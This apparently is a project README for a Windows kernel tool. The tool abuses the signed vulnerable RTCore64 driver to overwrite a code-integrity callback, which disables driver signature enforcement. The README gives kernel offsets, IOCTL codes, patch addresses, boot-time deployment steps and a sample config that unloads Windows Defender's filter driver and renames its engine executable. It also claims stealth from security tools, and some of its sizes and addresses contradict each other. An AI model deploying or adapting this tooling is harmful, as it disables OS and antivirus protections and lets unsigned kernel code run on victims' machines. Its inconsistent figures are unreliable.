# KernelResearchKit - Windows DSE Bypass Framework


[]()
[]()
[]()
[]()

## 📦 Download

**[KernelResearchKit.7z](https://github.com/wesmar/KernelResearchKit/releases/download/bypass-code-integrity/KernelResearchKit.7z)**  
🔐 **Password:** `github.com`

---

## 🎯 Overview

KernelResearchKit is a research framework for Windows kernel security analysis, demonstrating Driver Signature Enforcement (DSE) bypass through surgical manipulation of kernel code integrity callbacks. The framework provides two independent execution methods:

- **BootBypass.exe** - Native subsystem application executing during Windows boot sequence
- **drvloader.exe** - Win32 GUI application for interactive post-boot DSE manipulation

Both paths achieve identical results through different technical approaches, showcasing the versatility of the underlying vulnerability class.

### Key Features

**🔧 Boot-Time Execution (BootBypass)**
- Executes in Native subsystem (pre-Win32, SMSS phase)
- Automatic HVCI detection with scheduled reboot mechanism
- Dual-layer anti-loop protection (cleanup + RebootGuardian service)
- Sequential driver operations: LOAD, UNLOAD, RENAME, DELETE, AutoPatch
- State persistence via `drivers.ini` for DSE restoration

**💻 Runtime Execution (drvloader)**
- Interactive Win32 GUI with real-time DSE status checking
- Dynamic PDB symbol resolution from Microsoft Symbol Server
- Mini-PDB caching system (96-byte `.mpdb` files) for offline operation
- Automatic offset detection and `drivers.ini` synchronization
- No reboot required for DSE bypass operations

**🛡️ Safety Mechanisms**
- Dual-layer reboot loop protection (primary cleanup + RebootGuardian failsafe)
- Exception-wrapped kernel memory operations
- Registry backups before all modifications
- State validation and consistency checks

---

## 🗂️ Architecture

### Component 1: BootBypass (Native Subsystem Application)

BootBypass is a native application compiled with `/SUBSYSTEM:NATIVE`, executing during the Session Manager Subsystem (SMSS) phase of Windows boot. This timing provides a pristine environment where security services (Windows Defender, EDR, etc.) have not yet initialized.

**Execution Timeline:**


**Deployment via BootExecute Registry:**
```
Registry Key: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager
Value: BootExecute (REG_MULTI_SZ)
Content: 
  autocheck autochk *
  BootBypass
```

**Configuration File: `drivers.ini`**

Sequential operations defined in UTF-16 LE format with sections:
- `[Config]` - Global settings (Execute, RestoreHVCI, IOCTL codes, kernel offsets)
- `[DriverN]` - Load/unload operations with optional AutoPatch
- `[RenameN]` - File/directory renaming operations
- `[DeleteN]` - File/directory deletion (with RecursiveDelete option)
- `[DSE_STATE]` - Auto-generated state persistence for restoration

**AutoPatch Feature:**

New in this version: automatic DSE bypass cycle per driver. When `AutoPatch=YES` is set:
```
STEP 1: Load RTCore64.sys (vulnerable driver)
STEP 2: Patch DSE callback → ZwFlushInstructionCache
STEP 3: Load target unsigned driver
STEP 4: Restore original DSE callback
STEP 5: Unload RTCore64.sys
```

This eliminates manual DSE management - each driver gets its own isolated bypass session.

**Anti-Loop Protection (HVCI Handling):**

When Memory Integrity (HVCI) is enabled, DSE bypass succeeds but unsigned driver loading causes BSOD. The framework implements dual-layer protection:

```mermaid
graph TD
    subgraph "Boot 1: Detection"
        A[BootBypass Start] --> B[Layer 1: Cleanup Attempt]
        B --> C[RemoveThemesDependency]
        C --> D[RemoveRebootGuardianService]
        D --> E{HVCI=1?}
        E -->|Yes| F[Set HVCI=0]
        F --> G[Create RebootGuardian Service]
        G --> H[Add Themes→RebootGuardian Dependency]
        H --> I[skipPatch=TRUE]
        I --> J[Exit Without DSE Patch]
    end
    
    subgraph "Boot 2: Guardian Trigger"
        K[Windows Services Start] --> L[Themes Dependency Check]
        L --> M[SCM Starts RebootGuardian]
        M --> N[Execute: sc delete RebootGuardian]
        N --> O[Execute: reg delete DependOnService]
        O --> P[Execute: shutdown /r /t 0 /f]
    end
    
    subgraph "Boot 3: Clean Operation"
        Q[BootBypass Start] --> R[Layer 1: Cleanup Success]
        R --> S{HVCI=1?}
        S -->|No| T[skipPatch=FALSE]
        T --> U[Normal DSE Patching]
        U --> V[Load Unsigned Drivers]
        V --> W[RestoreHVCI Cosmetically]
    end
    
    J --> K
    P --> Q
    
    style F fill:#ff6b6b
    style G fill:#ff6b6b
    style U fill:#4ecdc4
```



**Why Dual-Layer?** Primary cleanup (Layer 1) executes on every boot before any operations. If system crashes/power fails before cleanup, secondary mechanism (Layer 2: RebootGuardian service) guarantees cleanup on next boot via Windows Service Control Manager.

---

### Component 2: drvloader (Win32 Runtime Tool)

Interactive DSE bypass tool with dynamic symbol resolution and offset detection. No reboot required for operations.

**Key Features:**
- **PDB Symbol Download**: Automatic download from `https://msdl.microsoft.com/download/symbols`
- **Mini-PDB Cache**: Creates 96-byte `.mpdb` files with extracted offsets for offline use
- **Offset Auto-Update**: Option 2 updates `drivers.ini` with current kernel offsets
- **No Driver Needed for Offset Detection**: PDB parsing requires no kernel driver installation

**Workflow:**

```mermaid
graph TD
    A[Launch drvloader.exe] --> B{HVCI Active?}
    B -->|Yes| C[Offer to Disable + Reboot]
    B -->|No| D[Display Menu]
    
    C -->|Accept| E[Disable HVCI → Reboot]
    C -->|Decline| F[Continue at Risk]
    
    D --> G{Select Option}
    F --> G
    
    G -->|1: Patch DSE| H[Load RTCore64]
    G -->|2: Show Offsets| I[Check Mini-PDB Cache]
    G -->|3: Exit| J[Cleanup]
    
    H --> K[Read Current Callback]
    K --> L[Write ZwFlushInstructionCache]
    L --> M[Verify Patch]
    M --> N[Unload RTCore64]
    
    I -->|Cache Hit| O[Display Cached Offsets]
    I -->|Cache Miss| P[Download PDB from Microsoft]
    P --> Q[Extract Offsets via DbgHelp]
    Q --> R[Create Mini-PDB]
    R --> S[Update drivers.ini]
    S --> O
    
    style H fill:#4ecdc4
    style P fill:#ffeb3b
    style R fill:#45b7d1
```


**Mini-PDB Format:**
```
File: C:\Windows\symbols\ntkrnlmp.pdb\{GUID}\ntkrnlmp.mpdb
Size: 32 bytes
Structure:
  - Magic: "MINIPDB\0" (8 bytes)
  - Version: 1 (4 bytes)
  - Reserved: (4 bytes)
  - Offset_SeCiCallbacks: (8 bytes)
  - Offset_SafeFunction: (8 bytes)
```

**Option 2 Functionality:**
1. Check for existing mini-PDB in cache (instant if found)
2. If not cached: download full PDB from Microsoft Symbol Server
3. Parse PDB using DbgHelp API to extract symbol offsets
4. Create mini-PDB for future use (no download needed next time)
5. Update `drivers.ini` [Config] section with current offsets
6. Display offset information for external tools

**Important:** Offsets are **constant for a specific Windows build**. After Windows update (new build), run Option 2 to regenerate offsets. Same build = same offsets (deterministic).

---

### Component 3: RTCore64.sys (Vulnerable Driver)

Signed vulnerable driver from Micro-Star International with unrestricted kernel memory read/write capabilities.

**IOCTL Codes (RTCore64-specific, hardcoded in driver):**
```
Read:  0x80002048 - CTL_CODE for physical memory read (4-byte DWORD)
Write: 0x8000204C - CTL_CODE for physical memory write (4-byte DWORD)
```

**Memory Packet Structure:**
```c
typedef struct _RTC_PACKET {
    UCHAR pad0[8];
    ULONGLONG addr;    // Target kernel address (no validation!)
    UCHAR pad1[8];
    ULONG size;        // Ignored by driver (always 4 bytes)
    ULONG value;       // Value to read/write
    UCHAR pad3[16];
} RTC_PACKET;
```

**Vulnerability Properties:**
- No address validation (accepts kernel space addresses)
- No privilege checking beyond device open
- No range restrictions (entire address space accessible)
- Signed by Microsoft-trusted certificate
- Loads without DSE bypass

**64-bit Write Decomposition:**

Driver only supports 32-bit operations. Framework decomposes 64-bit writes:
```
Write address 0xFFFFF80000F047A0 = 0xFFFFF8000069BFD0

Step 1: Write low DWORD  (addr+0) = 0x0069BFD0
Step 2: Write high DWORD (addr+4) = 0xFFFFF800

Non-atomic but safe: patching occurs before driver loading attempts.
```

---

### Component 4: OmniDriver & OmniUtility (Kernel Payload)

With DSE bypassed via BootBypass or drvloader, the framework can load unsigned kernel drivers. OmniDriver serves as a demonstration payload showcasing production-grade kernel memory operations.

**OmniDriver.sys** - Unsigned kernel driver with safe cross-process memory access.

**Safety Features:**
- **Process Context Switching**: Uses `KeStackAttachProcess()` for safe address space switching
- **Structured Exception Handling**: `__try/__except` blocks prevent BSOD from invalid memory access
- **Memory Probing**: `ProbeForRead`/`ProbeForWrite` validate addresses before operations
- **Intermediate Buffering**: Never performs direct cross-process copies (allocates non-paged buffer)
- **Proper Resource Cleanup**: Guaranteed cleanup even during exceptions

**IOCTL Interface:**
```
Read:  IOCTL_READWRITE_DRIVER_READ  = 0x80000800 (CTL_CODE custom)
Write: IOCTL_READWRITE_DRIVER_WRITE = 0x80000804 (CTL_CODE custom)

Request Structure:
  - ProcessId: Target process ID (DWORD)
  - Address: Virtual address in target process (ULONG_PTR)
  - Buffer: Buffer in caller's process (ULONG_PTR)
  - Size: Transfer size in bytes (SIZE_T, max 16KB)
  - Write: Direction flag (BOOLEAN: FALSE=read, TRUE=write)
  - Status: Operation result (NTSTATUS, output)
```

**OmniUtility.exe** - Demonstration application showcasing kernel capabilities:

**Features:**
1. **Universal Window Title Modification** - Changes all visible window titles simultaneously
2. **Direct Text Injection** - Injects text into Notepad buffers (clipboard + kernel write methods)
3. **Module Base Finder** - Enumerates all loaded modules in any process with base addresses
4. **Cross-Process Memory Operations** - Read/write arbitrary process memory via kernel driver

**Example Usage:**
```cmd
# Load OmniDriver via BootBypass (AutoPatch=YES in drivers.ini)
# OR manually after DSE bypass:
sc create OmniDriver binPath= C:\Windows\System32\drivers\OmniDriver.sys type= kernel
sc start OmniDriver

# Launch demonstration tool
OmniUtility.exe

Menu:
[1] Modify all window titles (demonstrates kernel-level window manipulation)
[2] Inject text into Notepad (demonstrates cross-process write)
[3] Find module bases (demonstrates process enumeration)
[0] Exit
```

**Technical Demonstration Value:**

OmniDriver showcases critical kernel programming concepts:
- Safe kernel-mode memory operations (no crashes despite invalid user input)
- Cross-process communication without `ReadProcessMemory`/`WriteProcessMemory` (direct kernel access)
- Exception-safe resource management in kernel context
- Proper privilege elevation and security context handling

---

## 🔬 Technical Deep Dive

### The ZwFlushInstructionCache Technique

Core innovation: replacing `CiValidateImageHeader` callback with `ZwFlushInstructionCache` - a benign kernel function with compatible signature and always-success behavior.

**Signature Compatibility:**

```
CiValidateImageHeader:        ZwFlushInstructionCache:
  RCX: ImageBase                RCX: ProcessHandle (ignored)
  RDX: ImageSize                RDX: BaseAddress (ignored)
  R8:  Flags                    R8:  Length (ignored)
  R9:  ImageInfo                (not used)
  Return: NTSTATUS              Return: STATUS_SUCCESS (always)
```

**Memory Layout:**
```
ntoskrnl.exe @ 0xFFFFF80000000000 (KASLR randomized base)

.text section:
  +0x69C1B0 = ZwFlushInstructionCache    ← Replacement function
  +0xA1B2C0 = CiValidateImageHeader      ← Original callback

.data section:
  +0xF04740 = SeCiCallbacks table base
    +0x20 = CiValidateImageHeader pointer ← PATCH TARGET
```

**Patching Operation:**
```
Target Address = ntBase + 0xF04740 + 0x20
Original Value = 0xFFFFF80000A1B2C0 (CiValidateImageHeader)
New Value      = 0xFFFFF80000069C1B0 (ZwFlushInstructionCache)
```

**Consequences:**
- Signature validation skipped (callback never invokes validation logic)
- All driver loads return `STATUS_SUCCESS`
- CI state flags remain unchanged (`g_CiEnabled` still TRUE)
- No event logs generated (validation "passes")
- Stealth: appears as legitimate CI operation to security tools

**Why This Works:**
- Single function pointer modified (not kernel code)
- `SeCiCallbacks` table not protected by PatchGuard
- `ZwFlushInstructionCache` has identical calling convention
- Always returns success regardless of input
- System stability maintained (no crashes or corruption)

---

## 🚀 Quick Start

### Prerequisites

**Required:**
- Windows 10/11 x64 (tested on Windows 11 25H2 Build 26200)
- Administrator privileges
- RTCore64.sys signed driver

**Not Required:**
- Test Signing mode
- Developer mode
- Secure Boot disable (works with Secure Boot enabled)

### Method A: Boot-Time Deployment (Persistent)

**Step 1: Deploy via PowerShell Script**
```powershell
# Extract KernelResearchKit.7z
# Navigate to extracted directory

# Right-click implementer.bat → Run as Administrator
# OR manually:
powershell -ExecutionPolicy Bypass -File implementer.ps1
```

**Interactive Menu:**
```
1. Deploy BootBypass (install to boot sequence)
2. Remove BootBypass (uninstall)
3. Exit
```

**Deployment Actions:**
- Copies `BootBypass.exe` → `C:\Windows\System32\`
- Copies `RTCore64.sys` → `C:\Windows\System32\drivers\`
- Copies `drivers.ini` → `C:\Windows\`
- Creates registry backup: `BootExecute_backup_YYYYMMDD_HHMMSS.reg`
- Adds BootExecute entry: `HKLM\...\Session Manager\BootExecute = "BootBypass"`

**Step 2: Configure Operations**

Edit `C:\Windows\drivers.ini` with desired operations:
```ini
[Config]
Execute=YES              ; Master switch (NO=disable all operations)
RestoreHVCI=NO          ; Re-enable Memory Integrity after operations

[Driver1]
Action=LOAD
AutoPatch=YES           ; Full DSE bypass cycle per driver
ServiceName=mydriver
ImagePath=\SystemRoot\System32\drivers\mydriver.sys
```

**Step 3: Reboot**
```cmd
shutdown /r /t 0
```

**Verification After Reboot:**
```powershell
# Check drivers.ini modification time (updated by BootBypass)
Get-ItemProperty C:\Windows\drivers.ini | Select-Object LastWriteTime

# Check if target driver loaded
sc query mydriver
```

---

### Method B: Runtime Manipulation (Interactive)

**Step 1: Launch drvloader**
```cmd
# Run as Administrator
drvloader.exe
```

**Step 2: Handle HVCI Detection**

If Memory Integrity (HVCI) is enabled, drvloader will display:
```
[!] WARNING: Memory Integrity (HVCI) is enabled!
[!] DSE bypass will succeed, but loading unsigned drivers will cause BSOD.
[!] Do you want to disable Memory Integrity and reboot? (Y/N):
```

Choose Y to automatically disable and reboot, or N to continue (testing only - don't load drivers).

**Step 3: Select Operation**

**Option 1: Patch DSE** (Disable driver signature enforcement)
```
Process:
1. Install and start RTCore64 driver
2. Locate ntoskrnl.exe base address via EnumDeviceDrivers
3. Calculate SeCiCallbacks + 0x20 target address
4. Read current callback (should be CiValidateImageHeader)
5. Save original callback to drivers.ini [DSE_STATE] section
6. Write ZwFlushInstructionCache address
7. Verify patch successful
8. Unload RTCore64 driver

Result: Unsigned drivers can now be loaded system-wide
```

**Option 2: Show Offsets** (Update drivers.ini with current kernel offsets)
```
Process:
1. Check for mini-PDB cache (C:\Windows\symbols\ntkrnlmp.pdb\{GUID}\ntkrnlmp.mpdb)
2. If cache hit: Display cached offsets instantly
3. If cache miss:
   a. Download ntoskrnl.pdb from Microsoft Symbol Server
   b. Parse PDB using DbgHelp API (no driver needed!)
   c. Extract SeCiCallbacks and ZwFlushInstructionCache offsets
   d. Create mini-PDB for future offline use (96 bytes)
4. Update C:\Windows\drivers.ini [Config] section
5. Save to registry: HKCU\Software\drvloader\History\{timestamp}
6. Display offset information

Output Example:
  Offset_SeCiCallbacks=0xF04740    ; g_CiCallbacks table base
  Offset_Callback=0x20              ; CiValidateImageHeader pointer offset
  Offset_SafeFunction=0x69C1B0      ; ZwFlushInstructionCache address
```

**Important:** These offsets are **constant for a specific ntoskrnl.exe build**. After Windows update, run Option 2 again to regenerate.

**Option 3: Restore DSE** (Re-enable driver signature enforcement)
```
Process:
1. Load saved state from drivers.ini [DSE_STATE] section
2. Verify original callback address exists
3. Install and start RTCore64 driver
4. Read current callback (should be ZwFlushInstructionCache)
5. Write original callback address (restore CiValidateImageHeader)
6. Verify restoration successful
7. Delete [DSE_STATE] section from drivers.ini
8. Unload RTCore64 driver

Result: Driver signature enforcement restored
```

---

## 📋 Configuration: drivers.ini

Complete configuration file with all supported operations:

```ini
; ============================================================================
; Global Configuration
; ============================================================================
[Config]
Execute=YES                       ; Master switch: YES=run, NO=exit immediately
RestoreHVCI=NO                   ; Re-enable Memory Integrity after operations

DriverDevice=\Device\RTCore64    ; Vulnerable driver device path
IoControlCode_Read=0x80002048    ; RTCore64 read IOCTL (DO NOT CHANGE)
IoControlCode_Write=0x8000204C   ; RTCore64 write IOCTL (DO NOT CHANGE)

; Kernel offsets (Windows 11 25H2 Build 26200 - update after Windows updates!)
Offset_SeCiCallbacks=0xF04740    ; g_CiCallbacks table base (constant per build)
Offset_Callback=0x20              ; CiValidateImageHeader pointer offset
Offset_SafeFunction=0x69C1B0      ; ZwFlushInstructionCache address

; ============================================================================
; Driver Operations
; ============================================================================
[Driver1]
Action=LOAD
AutoPatch=YES                     ; Automatic: Load RTCore64 → Patch → Load driver → Restore → Unload RTCore64
ServiceName=omnidriver
DisplayName=OmniDriver Research Tool
ImagePath=\SystemRoot\System32\drivers\omnidriver.sys
Type=KERNEL                       ; KERNEL or FILE_SYSTEM
StartType=DEMAND                  ; BOOT(0), SYSTEM(1), AUTO(2), DEMAND(3), DISABLED(4)
CheckIfLoaded=YES                ; Skip if already loaded

[Driver2]
Action=UNLOAD
ServiceName=WdFilter             ; Windows Defender filter driver
DisplayName=Windows Defender Mini-Filter

; ============================================================================
; File/Directory Operations
; ============================================================================
[Rename1]
Action=RENAME
DisplayName=Disable Windows Defender Executable
SourcePath=\??\C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0\MsMpEng.exe
TargetPath=\??\C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0\MsMpEng_.exe
ReplaceIfExists=NO               ; YES=overwrite, NO=fail if exists

[Delete1]
Action=DELETE
DisplayName=Remove Temporary Directory
DeletePath=\??\C:\Windows\Temp
RecursiveDelete=YES              ; YES=force delete tree, NO=fail if not empty
```

**Path Format (NT Native):**
```
Local drives:    \??\C:\Path\To\File
System paths:    \SystemRoot\System32\file.sys
Device paths:    \Device\HarddiskVolume1\Path
```

---

## 🛡️ Safety Features

**1. Dual-Layer Anti-Loop Protection**
- Primary: `RemoveThemesDependency()` + `RemoveRebootGuardianService()` on every boot
- Failsafe: RebootGuardian self-destruct service via Windows SCM

**2. State Persistence**
- Original callback saved to `[DSE_STATE]` section before patching
- Auto-restored on next run if system crashes during patch
- Idempotent operations (multiple save/restore cycles safe)

**3. Registry Backups**
- Automatic `.reg` file creation before modifications
- Timestamped: `BootExecute_backup_YYYYMMDD_HHMMSS.reg`
- Double-click to restore

**4. Exception Handling**
- All kernel memory operations wrapped in `__try/__except`
- Safe recovery from invalid addresses, page faults, access violations
- No BSOD from framework operations (driver stability guaranteed)

**5. Validation Checks**
- Current DSE state verification before patching
- State file consistency validation
- HVCI detection with automatic handling

---

## ⚠️ Limitations

**Cannot Bypass:**
- Intel SGX encrypted enclaves (hardware-protected memory)
- Virtualization-based isolation (requires hypervisor compromise)

**PatchGuard Compatibility:**
- ✅ Safe: Modifies data (function pointer), not kernel code
- ✅ Stable: `SeCiCallbacks` table not PatchGuard-protected
- ❌ Limitation: Cannot patch kernel `.text` section directly

**HVCI/Memory Integrity:**
- Hypervisor prevents kernel code page modifications when enabled
- Framework detects and disables HVCI automatically (requires reboot)
- After operations, cosmetically re-enables HVCI flag (requires full reboot to physically activate)

---

## 🎓 Educational Use Cases

**Security Research:**
- Analyze anti-cheat kernel drivers behavior
- Study Windows Code Integrity architecture
- Develop defensive techniques against DSE bypass

**Kernel Development:**
- Test unsigned drivers during development (no test signing needed)
- Debug driver loading mechanisms
- Analyze kernel callback chains

**Forensics:**
- Extract memory from protected processes
- Analyze security software behavior
- Incident response toolkit

---

## ⚖️ Legal Disclaimer

**FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**

This framework demonstrates advanced Windows kernel security concepts. Users must:
- Obtain explicit authorization before testing on systems they don't own
- Comply with local computer crime statutes and anti-circumvention laws
- Respect software license agreements and terms of service
- Use only in isolated lab environments or authorized penetration testing

**Prohibited Uses:**
- Circumventing software licensing or copy protection
- Cheating in online games or competitions
- Unauthorized access to computer systems
- Malware development or distribution
- Any illegal or unethical activities

**Liability:** The author provides this framework "AS IS" without warranties. The author is not responsible for misuse by third parties. Users assume all legal and ethical responsibility.

**Responsible Disclosure:** If discovering vulnerabilities using this framework, contact affected vendors (e.g., Microsoft MSRC: secure@microsoft.com) before public disclosure.

---

## 📞 Contact & Contributing

**Author:** Marek Wesołowski  
**Email:** marek@wesolowski.eu.org  
**Website:** https://kvc.pl  
**WhatsApp:** +48 607 440 283  

**Repository:** https://github.com/wesmar/KernelResearchKit  
**Issues:** https://github.com/wesmar/KernelResearchKit/issues

**Contributions Welcome:**
- Additional vulnerable driver configurations
- Kernel version compatibility (new offset sets)
- Alternative safe callback functions
- Documentation improvements and translations

---

## 📊 Technical Specifications

```
Lines of Code:
  - BootBypass (native):    ~2,500
  - drvloader (C++):        ~1,800
  - Total:                  ~4,300

Supported Windows:
  - Windows 11 (25H2)    ✅ Tested
  - Windows 10 (1809+)   ⚠️  Unverified (offset adjustment required)

Architecture: x64 only

Tested Configuration:
  - Windows 11 25H2 Build 26200.8460
```

---

## 📄 License

MIT License - Copyright (c) 2025 Marek Wesołowski

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED.

---

**⚠️ USE RESPONSIBLY • EDUCATIONAL PURPOSE ONLY • AUTHORIZED TESTING ONLY ⚠️**

**Version:** 1.0.0 | **Last Updated:** November 2025 | **Status:** Active Development